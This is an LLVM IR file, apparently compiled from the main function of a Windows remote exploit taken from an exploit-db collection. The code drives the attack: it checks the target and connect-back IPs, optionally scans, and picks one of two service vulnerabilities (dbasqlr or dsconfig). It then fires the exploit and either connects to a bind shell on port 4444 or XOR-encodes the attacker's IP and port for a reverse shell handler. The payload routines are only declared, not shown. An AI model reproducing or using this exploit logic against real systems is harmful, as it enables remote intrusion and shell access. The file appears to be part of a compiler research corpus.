; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1132.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1132.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i32, i32, i32 }

@.str = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"Invalid Target IP!\0A\00", align 1
@.str.2 = private unnamed_addr constant [26 x i8] c"Invalid Connect Back IP!\0A\00", align 1
@PORT_DBASQLR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [22 x i8] c"exploitation failed!\0A\00", align 1
@PORT_DSCONFIG = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i16, align 2
  %12 = alloca %struct.TYPE_4__, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %13 = call i32 @system(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 (...) @header()
  %15 = load i32, i32* %4, align 4
  %16 = load i8**, i8*** %5, align 8
  %17 = call i32 @parse_arguments(i32 %15, i8** %16, %struct.TYPE_4__* %12)
  %18 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 2
  %19 = load i32, i32* %18, align 4
  %20 = call i32 @isip(i32 %19)
  %21 = icmp ne i32 %20, 0
  br i1 %21, label %25, label %22

22:                                               ; preds = %2
  %23 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %24 = call i32 @exit(i32 1) #3
  unreachable

25:                                               ; preds = %2
  %26 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 1
  %27 = load i32, i32* %26, align 4
  %28 = call i32 @isip(i32 %27)
  %29 = icmp ne i32 %28, 0
  br i1 %29, label %33, label %30

30:                                               ; preds = %25
  %31 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.2, i64 0, i64 0))
  %32 = call i32 @exit(i32 1) #3
  unreachable

33:                                               ; preds = %25
  %34 = call i32 (...) @select_action()
  store i32 %34, i32* %7, align 4
  %35 = load i32, i32* %7, align 4
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %39, label %37

37:                                               ; preds = %33
  %38 = call i32 @start_scanner(%struct.TYPE_4__* %12)
  br label %39

39:                                               ; preds = %37, %33
  %40 = call i32 (...) @select_vulnerability()
  store i32 %40, i32* %8, align 4
  %41 = call i32 (...) @select_shellcode()
  store i32 %41, i32* %9, align 4
  %42 = load i32, i32* %8, align 4
  switch i32 %42, label %125 [
    i32 0, label %43
    i32 1, label %84
  ]

43:                                               ; preds = %39
  %44 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 2
  %45 = load i32, i32* %44, align 4
  %46 = load i32, i32* @PORT_DBASQLR, align 4
  %47 = call i32 @connect_to_remote_host(i32 %45, i32 %46)
  store i32 %47, i32* %6, align 4
  %48 = load i32, i32* %9, align 4
  switch i32 %48, label %83 [
    i32 0, label %49
    i32 1, label %60
  ]

49:                                               ; preds = %43
  %50 = load i32, i32* %6, align 4
  %51 = call i32 @exploit_dbasqlr(i32 %50, i64 0, i16 zeroext 0, i32 1)
  %52 = icmp eq i32 %51, 1
  br i1 %52, label %53, label %56

53:                                               ; preds = %49
  %54 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %55 = call i32 @exit(i32 1) #3
  unreachable

56:                                               ; preds = %49
  %57 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 2
  %58 = load i32, i32* %57, align 4
  %59 = call i32 @connect_to_bindshell(i32 %58, i32 4444)
  br label %83

60:                                               ; preds = %43
  %61 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 1
  %62 = load i32, i32* %61, align 4
  %63 = call i64 @inet_addr(i32 %62)
  %64 = xor i64 %63, 2576980377
  store i64 %64, i64* %10, align 8
  %65 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 0
  %66 = load i32, i32* %65, align 4
  %67 = call zeroext i16 @htons(i32 %66)
  %68 = zext i16 %67 to i32
  %69 = xor i32 %68, 39321
  %70 = trunc i32 %69 to i16
  store i16 %70, i16* %11, align 2
  %71 = load i32, i32* %6, align 4
  %72 = load i64, i64* %10, align 8
  %73 = load i16, i16* %11, align 2
  %74 = call i32 @exploit_dbasqlr(i32 %71, i64 %72, i16 zeroext %73, i32 0)
  %75 = icmp eq i32 %74, 1
  br i1 %75, label %76, label %79

76:                                               ; preds = %60
  %77 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %78 = call i32 @exit(i32 1) #3
  unreachable

79:                                               ; preds = %60
  %80 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 0
  %81 = load i32, i32* %80, align 4
  %82 = call i32 @start_reverse_handler(i32 %81)
  br label %83

83:                                               ; preds = %43, %79, %56
  br label %125

84:                                               ; preds = %39
  %85 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 2
  %86 = load i32, i32* %85, align 4
  %87 = load i32, i32* @PORT_DSCONFIG, align 4
  %88 = call i32 @connect_to_remote_host(i32 %86, i32 %87)
  store i32 %88, i32* %6, align 4
  %89 = load i32, i32* %9, align 4
  switch i32 %89, label %124 [
    i32 0, label %90
    i32 1, label %101
  ]

90:                                               ; preds = %84
  %91 = load i32, i32* %6, align 4
  %92 = call i32 @exploit_dsconfig(i32 %91, i64 0, i16 zeroext 0, i32 1)
  %93 = icmp eq i32 %92, 1
  br i1 %93, label %94, label %97

94:                                               ; preds = %90
  %95 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %96 = call i32 @exit(i32 1) #3
  unreachable

97:                                               ; preds = %90
  %98 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 2
  %99 = load i32, i32* %98, align 4
  %100 = call i32 @connect_to_bindshell(i32 %99, i32 4444)
  br label %124

101:                                              ; preds = %84
  %102 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 1
  %103 = load i32, i32* %102, align 4
  %104 = call i64 @inet_addr(i32 %103)
  %105 = xor i64 %104, 2576980377
  store i64 %105, i64* %10, align 8
  %106 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 0
  %107 = load i32, i32* %106, align 4
  %108 = call zeroext i16 @htons(i32 %107)
  %109 = zext i16 %108 to i32
  %110 = xor i32 %109, 39321
  %111 = trunc i32 %110 to i16
  store i16 %111, i16* %11, align 2
  %112 = load i32, i32* %6, align 4
  %113 = load i64, i64* %10, align 8
  %114 = load i16, i16* %11, align 2
  %115 = call i32 @exploit_dsconfig(i32 %112, i64 %113, i16 zeroext %114, i32 0)
  %116 = icmp eq i32 %115, 1
  br i1 %116, label %117, label %120

117:                                              ; preds = %101
  %118 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.3, i64 0, i64 0))
  %119 = call i32 @exit(i32 1) #3
  unreachable

120:                                              ; preds = %101
  %121 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %12, i32 0, i32 0
  %122 = load i32, i32* %121, align 4
  %123 = call i32 @start_reverse_handler(i32 %122)
  br label %124

124:                                              ; preds = %84, %120, %97
  br label %125

125:                                              ; preds = %39, %124, %83
  %126 = load i32, i32* %3, align 4
  ret i32 %126
}

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @header(...) #1

declare dso_local i32 @parse_arguments(i32, i8**, %struct.TYPE_4__*) #1

declare dso_local i32 @isip(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @select_action(...) #1

declare dso_local i32 @start_scanner(%struct.TYPE_4__*) #1

declare dso_local i32 @select_vulnerability(...) #1

declare dso_local i32 @select_shellcode(...) #1

declare dso_local i32 @connect_to_remote_host(i32, i32) #1

declare dso_local i32 @exploit_dbasqlr(i32, i64, i16 zeroext, i32) #1

declare dso_local i32 @connect_to_bindshell(i32, i32) #1

declare dso_local i64 @inet_addr(i32) #1

declare dso_local zeroext i16 @htons(i32) #1

declare dso_local i32 @start_reverse_handler(i32) #1

declare dso_local i32 @exploit_dsconfig(i32, i64, i16 zeroext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
